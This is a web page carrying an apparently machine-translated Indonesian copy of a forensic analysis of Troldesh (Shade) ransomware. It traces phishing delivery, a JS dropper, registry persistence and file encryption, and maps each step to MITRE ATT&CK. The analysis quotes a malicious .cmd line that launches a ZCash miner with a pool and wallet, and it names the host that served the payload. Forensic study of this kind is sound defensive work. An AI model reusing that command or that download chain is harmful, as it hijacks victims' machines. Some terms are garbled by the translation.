<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ¤˜ğŸ¿ ğŸ‘©ğŸ¾â€ğŸ« ğŸ”‚ Hanya itu yang tersisa setelah Anda: artefak forensik Troldesh ransomware (Shade) ğŸ“¤ ğŸ… ğŸ¤Ÿ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Jika Anda mengikuti berita , maka Anda mungkin tahu tentang serangan besar-besaran baru-baru ini pada perusahaan Rusia terhadap virus ransomware Trold...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Hanya itu yang tersisa setelah Anda: artefak forensik Troldesh ransomware (Shade)</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/group-ib/blog/457592/"><img src="https://habrastorage.org/webt/tx/fa/y5/txfay55dbgafekaewi9vtxtv5nw.png" alt="gambar"><br><br>  Jika Anda mengikuti <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">berita</a> , maka Anda mungkin tahu tentang serangan besar-besaran baru-baru ini pada perusahaan Rusia terhadap virus ransomware Troldesh (Shade), salah satu pengunci crypto yang paling populer di kalangan penjahat cyber.  Pada bulan Juni saja, Group-IB menemukan lebih dari 1.100 email phishing dari Troldesh yang dikirim atas nama karyawan maskapai besar, dealer mobil, dan media. <br><br>  Pada artikel ini, kita akan melihat artefak forensik yang dapat ditemukan setelah serangan Shade / Troldesh pada media dari perangkat yang dikompromikan, dan juga membandingkan taktik dan teknik yang digunakan oleh penyerang dengan MITER ATT &amp; CK. <br><br>  Diposting oleh <b>Oleg Skulkin</b> , spesialis forensik terkemuka di Group-IB <br><a name="habracut"></a><br>  Troldesh, juga dikenal sebagai Shade, XTBL, Trojan.Encoder.858, Da Vinci, No_more_ransome, adalah virus yang mengenkripsi file pada perangkat pengguna yang terinfeksi dan memerlukan tebusan untuk mengembalikan akses ke informasi.  Kampanye terbaru dengan Troldesh telah menunjukkan bahwa sekarang ini tidak hanya mengenkripsi file, tetapi juga cryptocurrency penambang dan menghasilkan lalu lintas ke situs web untuk meningkatkan lalu lintas dan pendapatan dari iklan online. <br><br>  Pertama kali aktivitas Troldesh terdeteksi oleh pakar Group-IB pada tahun 2015, mereka memperhatikan bahwa virus tersebut berhasil menghindari alat perlindungan antivirus.  Penyerang secara teratur mengubah "packer" - program packer yang mengurangi ukuran file dan membuatnya sulit untuk dideteksi dan dibalik - karena itu, program antivirus sering melewatkannya.  Pada akhir tahun 2018, Troldesh menjadi salah satu virus paling populer dan dengan percaya diri masuk dalam 3 besar, bersama dengan RTM dan Pony.  Para ahli PaloAlto Networks melaporkan bahwa Troldesh bekerja tidak hanya untuk keperluan Rusia - di antara negara-negara yang terkena ransomware adalah Amerika Serikat, Jepang, India, Thailand, dan Kanada. <br><br><h3>  Vektor infeksi awal </h3><br>  Biasanya, "Troldesh / Shade" didistribusikan melalui email phishing dengan lampiran berbahaya, misalnya, arsip yang dilindungi kata sandi yang berisi file JS berbahaya, setelah dibuka di mana cryptolocker diunduh dan diluncurkan.  Apa artinya ini?  Ini akan menjadi ide yang baik untuk memulai studi kami dengan menganalisis jejak pembukaan arsip tersebut.  Di mana jejak tersebut dapat ditemukan?  Misalnya, dalam Daftar Langsung: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/hh/k-/yp/hhk-ypo6ixpvwwayr35d2b_u1qg.png" alt="alt gambar"></div><br>  <i>Data diekstraksi dari file 5f7b5f1e01b83767.automaticDestinations-ms menggunakan JLECmd</i> <i><br></i> <br>  Jadi, kita melihat bahwa pengguna membuka arsip dengan nama "kata sandi 11.rar tentang pemesanan".  Tapi bagaimana dia masuk ke sistem?  File ini terletak di direktori Unduhan, kemungkinan besar itu diunduh dari Internet.  Mari kita lihat sejarah peramban: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ws/bd/p_/wsbdp_7cry0lrxupqxpultymp3w.png" alt="alt gambar"></div><br>  <i>Data diekstraksi dari file WebCache01.dat menggunakan Belkasoft Evidence Center</i> <i><br></i> <br>  Seperti yang Anda lihat, file diunduh menggunakan browser web Microsoft Edge dan disimpan di direktori Unduhan.  Selain itu, tepat sebelum mengunduh, pengguna mengunjungi situs web-mail, oleh karena itu, arsip diterima melalui email. <br>  Jadi, kita berhadapan dengan teknik yang paling umum: T1193 - â€œSpearphishing Attachmentâ€. <br><br><h3>  Mulai dan pintas mekanisme perlindungan </h3><br>  Jika kita melihat ke dalam arsip, kita akan menemukan file JS dengan nama yang hampir sama.  Agar malware memuat dan mulai bekerja, pengguna harus mengklik dua kali pada file yang ditentukan.  Setelah itu, "wscript.exe" akan meluncurkan file JS, yang akan mengunduh file jahat dari <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mat.tradetoolsfx</a> [.] Com dan jalankan.  Bisakah kita menemukan jejak ini di disk?  Tentu saja! <br><br>  Mari kita lihat file prefetch wscript.exe, dengan fokus pada file-file yang berinteraksi dengannya: <br>  &lt;...&gt; <br>  \ VOLUME {01d3dcb4976cd072-3a97874f} \ PENGGUNA \ 0136 \ APPDATA \ LOKAL \ MICROSOFT \ WINDOWS \ INETCACHE \ IE \ OEJ87644 \ 1C [1] .JPG <br>  \ VOLUME {01d3dcb4976cd072-3a97874f} \ PENGGUNA \ 0136 \ APPDATA \ LOKAL \ TEMP \ 7ZO84024637 \ DETAIL PESANAN A.JS <br>  &lt;...&gt; <br>  Jadi, kami memiliki dua file menarik.  Pertama, sekarang kita tahu nama file JS yang ada di arsip, dan kedua, kami menemukan nama file yang diunduh.  Saatnya mencari tahu dari mana itu diunduh.  Mari kita lihat WebCache01.dat lagi: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/1u/4v/9_/1u4v9_9f9ulw6w11yfm7ftvu-ns.png" alt="alt gambar"></div><br>  <i>Data diambil dari WebCache01.dat menggunakan ESEDatabaseView</i> <i><br></i> <br>  Jika kami mendekode konten bidang ResponseHeaders, kami mendapatkan yang berikut: <br>  HTTP / 1.1 200 OK <br>  Tipe-Konten: gambar / jpeg <br>  Panjang Konten: 1300656 <br>  ETag: "5ced19b6-13d8b0" <br>  Ketat-Transport-Security: max-age = 31536000; <br>  Sebenarnya, ini bukan file JPG, tetapi file yang dapat dieksekusi yang mendekripsi dan meluncurkan instance Shade. <br>  Jadi teknik apa yang kita hadapi di sini?  Scripting (T1064), Eksekusi Pengguna (T1204), dan Masquerading (T1036). <br><br><h3>  Pin sistem </h3><br>  "Naungan" menggunakan cara yang agak sepele untuk memperbaiki sistem - kunci registri "Perangkat Lunak \ Microsoft \ Windows \ CurrentVersion \ Run" (T1060).  Kita sudah tahu bahwa file JS jahat dibuka oleh pengguna "0136", jadi lihatlah file yang sesuai "NTUSER.DAT": <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/w-/q9/fd/w-q9fdff43kczyndmw7ak9xdgxg.png" alt="alt gambar"></div><br>  <i>Mekanisme penguncian dalam sistem terdeteksi oleh Belkasoft Evidence Center</i> <i><br></i> <br>  Tapi itu belum semuanya!  Lebih jauh lebih menarik: <br><div style="text-align:center;"><img src="https://habrastorage.org/webt/gm/hl/mz/gmhlmzuplqi7rketrgukc_thomi.png" alt="alt gambar"></div><br>  <i>Mekanisme penguncian dalam sistem terdeteksi oleh Belkasoft Evidence Center</i> <i><br></i> <br>  Seperti yang dapat Anda lihat di ilustrasi, ada entri menarik lain yang menunjuk ke C: \ ProgramData \ SysWOW64 \ leWRX7w.cmd.  Mari kita lihat apa yang ada di dalam file ini: <br>  gema CreateObject ("Wscript.Shell"). Jalankan "" ^ &amp; WScript. Argumen (0) ^ &amp; "", 0, False&gt; "% TEMP% / pxNXSB.vbs" &amp;&amp; start / WAIT wscript.exe "% TEMP% /pxNXSB.vbs "" C: \ Users \ 0136 \ AppData \ Roaming \ SOFTWA ~ 1 \ NHEQMI ~ 1.EXE -l eu1-zcash.flypool.org âˆ— 333 -u t1L9iBXyRgaYrQ5JSTSdstopV6pHtZ2Xdep% TEMP% \ pxNXSB.vbs " <br>  Jadi, kami punya satu file lagi.  Dilihat dari isinya, digunakan oleh penyerang untuk menambang cryptocurrency ZCash.  Jadi, bahkan jika korban membayar tebusan, sumber daya sistemnya masih akan digunakan oleh pengganggu. <br><br><h3>  Konsekuensinya </h3><br>  Pertama-tama, "Shade" adalah cryptoclocker, jadi hal pertama yang menarik perhatian Anda adalah banyak file dengan ekstensi "CRYPTED000007", file "Read Me", serta wallpaper "segar" di desktop Anda: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/xc/wd/pv/xcwdpvfzo6gdobpsq6yyuiwozmg.png" alt="alt gambar"></div><br>  File dengan gambar ini dapat ditemukan di direktori C: \ Users \% username% \ AppData \ Roaming.  Peralatan apa yang kita hadapi?  "Data Dienkripsi untuk Dampak" (T1486). <br>  Tapi, seperti yang sudah Anda pahami, "Naungan" bukanlah loker kripto biasa.  Selain cryptoclocker itu sendiri, kami juga menemukan penambang, yang berarti perlu menyebutkan teknik lain - "Pembajakan Sumber Daya". <br><br><h3>  ATT &amp; CK MITER </h3><br>  Analisis kami mengungkapkan sejumlah taktik dan teknik distributor Shade, mari kita simpulkan: <br><br><div class="scrollable-table"><table><tbody><tr><th>  ID </th><th>  Nama </th><th>  Deskripsi </th></tr><tr><td>  <b>T1193</b> </td><td>  Lampiran Spearphishing </td><td>  Naungan didistribusikan melalui email phishing dengan lampiran berbahaya </td></tr><tr><td>  <b>T1204</b> </td><td>  Eksekusi pengguna </td><td>  File JS dari arsip yang dilampirkan ke email harus diluncurkan oleh pengguna. </td></tr><tr><td>  <b>T1064</b> </td><td>  Scripting </td><td>  Penyerang menggunakan file JS untuk mengunduh malware </td></tr><tr><td>  <b>T1036</b> </td><td>  Menyamar </td><td>  File malware yang diunduh memiliki ekstensi "JPG" alih-alih "EXE" </td></tr><tr><td>  <b>T1060</b> </td><td>  Registry Run Keys / Startup Folder </td><td>  "Naungan" menggunakan kunci registri "Perangkat Lunak \ Microsoft \ Windows \ CurrentVersion \ Run" untuk berlabuh di sistem </td></tr><tr><td>  <b>T1486</b> </td><td>  Data Dienkripsi untuk Dampak </td><td>  Naungan mengenkripsi file untuk tebusan </td></tr><tr><td>  <b>T1496</b> </td><td>  Pembajakan sumber daya </td><td>  Shade menggunakan sumber daya komputer korban untuk menambang cryptocurrency </td></tr></tbody></table></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id457592/">https://habr.com/ru/post/id457592/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id457576/index.html">KnowledgeConf - lepas landas atau tidak?</a></li>
<li><a href="../id457578/index.html">Sistem neuromorfik: komputer yang terinspirasi oleh otak manusia</a></li>
<li><a href="../id457580/index.html">JavaScript: Membuat aplikasi MEVN sederhana</a></li>
<li><a href="../id457582/index.html">Keringat, air mata, dan pelacakan waktu - bagaimana kami meningkatkan profitabilitas perusahaan</a></li>
<li><a href="../id457588/index.html">Barcamp - acara publik pertama di desa</a></li>
<li><a href="../id457596/index.html">OSDay 19 atau mengapa bahasa C masih hidup</a></li>
<li><a href="../id457600/index.html">Ikhtisar Headset Snom A150, Snom A100M dan D</a></li>
<li><a href="../id457602/index.html">Meneliti kinerja DBMS MS SQL Server Developer 2016 dan PostgreSQL 10.5 untuk 1C</a></li>
<li><a href="../id457606/index.html">Alan Kay: Apa yang bisa disebut hal paling menakjubkan yang dimungkinkan oleh komputer</a></li>
<li><a href="../id457608/index.html">Cara memvisualisasikan data menjadi cerita yang menarik</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>